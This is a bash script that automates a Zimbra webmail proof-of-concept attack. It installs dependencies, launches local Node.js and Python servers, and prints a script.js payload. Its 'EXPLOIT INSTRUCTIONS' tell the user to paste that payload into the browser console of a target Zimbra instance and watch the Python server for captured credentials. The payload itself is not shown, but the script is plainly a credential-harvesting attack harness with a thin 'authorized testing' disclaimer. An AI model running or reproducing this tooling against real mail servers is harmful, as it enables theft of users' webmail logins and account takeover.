#!/bin/bash

# Zimbra Vulnerability PoC Automation Script for POSIX Systems
# Author: Automated Script Generator
# Version: 1.0
# For educational and authorized testing purposes only.

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;36m'
NC='\033[0m' # No Color

# Global variables for process IDs
NODE_PID=""
PYTHON_PID=""

# Function to print colored output
print_color() {
    local color=$1
    local message=$2
    echo -e "${color}${message}${NC}"
}

# Function to show banner
show_banner() {
    print_color $BLUE "========================================"
    print_color $BLUE "   Zimbra Vulnerability PoC Automation"
    print_color $BLUE "========================================"
}

# Function to check prerequisites
check_prerequisites() {
    print_color $YELLOW "\n[INFO] Checking prerequisites..."
    
    # Check if Node.js is installed
    if command -v node >/dev/null 2>&1; then
        local node_version=$(node --version)
        print_color $GREEN "[✓] Node.js found: $node_version"
    else
        print_color $RED "[✗] Node.js not found. Please install Node.js from https://nodejs.org/"
        exit 1
    fi
    
    # Check if Python is installed
    if command -v python3 >/dev/null 2>&1; then
        local python_version=$(python3 --version)
        print_color $GREEN "[✓] Python found: $python_version"
    elif command -v python >/dev/null 2>&1; then
        local python_version=$(python --version)
        print_color $GREEN "[✓] Python found: $python_version"
    else
        print_color $RED "[✗] Python not found. Please install Python from https://python.org/"
        exit 1
    fi
    
    # Check if npm is available
    if command -v npm >/dev/null 2>&1; then
        local npm_version=$(npm --version)
        print_color $GREEN "[✓] npm found: $npm_version"
    else
        print_color $RED "[✗] npm not found. Please ensure Node.js is properly installed."
        exit 1
    fi
}

# Function to install dependencies
install_dependencies() {
    print_color $YELLOW "\n[INFO] Installing npm dependencies..."
    
    if [ -f "package.json" ]; then
        if npm install; then
            print_color $GREEN "[✓] Dependencies installed successfully"
        else
            print_color $RED "[✗] Failed to install dependencies"
            exit 1
        fi
    else
        print_color $RED "[✗] package.json not found. Please run this script from the project directory."
        exit 1
    fi
}

# Function to start servers
start_servers() {
    print_color $YELLOW "\n[INFO] Starting servers..."
    
    # Start Node.js server in background
    print_color $YELLOW "[INFO] Starting Node.js server on port 4000..."
    node server.js &
    NODE_PID=$!
    
    # Wait a moment for the server to start
    sleep 2
    
    # Start Python server in background
    print_color $YELLOW "[INFO] Starting Python server on port 3001..."
    if command -v python3 >/dev/null 2>&1; then
        python3 server.py &
    else
        python server.py &
    fi
    PYTHON_PID=$!
    
    # Wait a moment for the server to start
    sleep 3
    
    # Check if servers are running
    if curl -s -o /dev/null -w "%{http_code}" "http://localhost:4000" | grep -q "200\|302"; then
        print_color $GREEN "[✓] Node.js server is running on http://localhost:4000"
    else
        print_color $RED "[✗] Node.js server failed to start"
    fi
    
    if curl -s -o /dev/null "http://localhost:3001" 2>/dev/null; then
        print_color $GREEN "[✓] Python server is running on http://localhost:3001"
    else
        print_color $YELLOW "[!] Python server may still be starting..."
    fi
}

# Function to show exploit instructions
show_exploit_instructions() {
    print_color $BLUE "\n========================================"
    print_color $BLUE "          EXPLOIT INSTRUCTIONS"
    print_color $BLUE "========================================"
    echo
    echo "1. Open your target Zimbra webmail instance in a browser"
    echo
    echo "2. Open Browser Developer Tools (F12)"
    echo
    echo "3. Navigate to the Console tab"
    echo
    echo "4. Copy and paste the contents of 'script.js' into the console"
    echo
    echo "5. Press Enter to execute the exploit"
    echo
    echo "6. Monitor the Python server logs for captured credentials"
    echo
    print_color $BLUE "========================================"
    
    print_color $YELLOW "\nScript contents (script.js):"
    print_color $YELLOW "You can copy this content:"
    
    if [ -f "script.js" ]; then
        print_color $GREEN "\n--- COPY FROM HERE ---"
        cat script.js
        print_color $GREEN "\n--- COPY UNTIL HERE ---\n"
    else
        print_color $RED "[✗] script.js not found!"
    fi
}

# Function to stop servers
stop_servers() {
    print_color $YELLOW "\n[INFO] Stopping servers..."
    
    if [ ! -z "$NODE_PID" ]; then
        if kill -0 $NODE_PID 2>/dev/null; then
            kill $NODE_PID
            print_color $GREEN "[✓] Node.js server stopped"
        fi
    fi
    
    if [ ! -z "$PYTHON_PID" ]; then
        if kill -0 $PYTHON_PID 2>/dev/null; then
            kill $PYTHON_PID
            print_color $GREEN "[✓] Python server stopped"
        fi
    fi
    
    # Kill any remaining processes on the ports
    local node_proc=$(lsof -ti:4000 2>/dev/null || true)
    local python_proc=$(lsof -ti:3001 2>/dev/null || true)
    
    if [ ! -z "$node_proc" ]; then
        kill -9 $node_proc 2>/dev/null || true
    fi
    
    if [ ! -z "$python_proc" ]; then
        kill -9 $python_proc 2>/dev/null || true
    fi
}

# Function to handle cleanup on exit
cleanup() {
    stop_servers
    print_color $BLUE "\n[INFO] Cleanup completed. Exploit automation finished."
    exit 0
}

# Set up trap for cleanup on script exit
trap cleanup EXIT INT TERM

# Main function
main() {
    show_banner
    
    check_prerequisites
    install_dependencies
    start_servers
    show_exploit_instructions
    
    print_color $YELLOW "\nServers are running. Press Ctrl+C to stop the servers and exit..."
    
    # Wait indefinitely until user interrupts
    while true; do
        sleep 1
    done
}

# Check if script is being sourced or executed
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
